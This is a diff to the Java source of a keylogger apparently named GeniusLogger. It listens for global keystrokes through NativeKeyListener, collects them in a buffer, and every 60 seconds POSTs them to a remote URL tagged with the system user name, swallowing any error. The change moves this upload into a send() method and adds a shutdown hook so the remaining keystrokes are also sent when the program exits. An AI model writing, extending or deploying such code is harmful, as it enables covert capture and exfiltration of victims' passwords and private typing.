@@ -37,29 +37,32 @@ public final class GeniusLogger implements NativeKeyListener {
             System.exit(-1);
         }
 
-        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
-            try {
-                if (this.builder.length() == 0) return;
+        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this::send, 60, 60, TimeUnit.SECONDS);
+        Runtime.getRuntime().addShutdownHook(new Thread(this::send));
+    }
 
-                final HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setDoOutput(true);
-                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                conn.setRequestProperty("Content-Length", Integer.toString(this.builder.length()));
-                conn.setRequestProperty("Genius-Name", System.getProperty("user.name"));
-                conn.setUseCaches(false);
+    public void send() {
+        try {
+            if (this.builder.length() == 0) return;
 
-                try (final DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
-                    dos.writeBytes(this.builder.deleteCharAt(this.builder.length() - 1).toString());
-                }
+            final HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            conn.setRequestProperty("Content-Length", Integer.toString(this.builder.length()));
+            conn.setRequestProperty("Genius-Name", System.getProperty("user.name"));
+            conn.setUseCaches(false);
 
-                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
-                    while (br.readLine() != null) continue;
-                }
+            try (final DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
+                dos.writeBytes(this.builder.deleteCharAt(this.builder.length() - 1).toString());
+            }
 
-                this.builder.setLength(0);
-            } catch (Exception ignored) {}
-        }, 60, 60, TimeUnit.SECONDS);
+            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
+                while (br.readLine() != null) continue;
+            }
+
+            this.builder.setLength(0);
+        } catch (Exception ignored) {}
     }
 
     @Override
